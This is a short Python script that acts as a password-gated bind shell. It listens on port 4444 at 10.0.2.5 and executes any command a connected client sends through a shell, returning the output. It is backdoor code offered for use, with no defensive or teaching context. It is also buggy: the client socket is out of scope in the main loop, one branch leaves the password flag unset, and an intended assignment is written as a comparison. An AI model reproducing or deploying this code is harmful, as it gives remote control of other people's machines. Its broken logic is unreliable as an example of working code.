import socket
import subprocess


def lookForConnection(server):
    server.listen(1)
    client, client_addr = server.accept()
    client.send(("Input password for client: ").encode())
    password = client.recv(1024)
    password = password.decode()
    if password == real_password:
        passwords_match = True
    else:
        client.send(("Incorrect Password...Closing Connection").encode())
        client.close()
    print(str(client_addr) + " has connected to the server")
    return passwords_match

HOST = '10.0.2.5'
PORT = 4444 
real_password = ""
passwords_match = False
server = socket.socket()
server.bind((HOST, PORT))
print('Server Started')
print('Listening For Client Connection')
lookForConnection(server)

while passwords_match == True:
    print("[-] Awaiting commands...")
    command = client.recv(1024)
    command = command.decode()
    if command == "exit":
        passwords_match == False
        client.close()
        lookForConnection(server)
    else:
        op = subprocess.Popen(command, shell=True, stderr=subprocess.PIPE, stdout=subprocess.PIPE)
        output = op.stdout.read()
        output_error = op.stderr.read()
        print("[-] Sending response...")
        client.send(output + output_error)
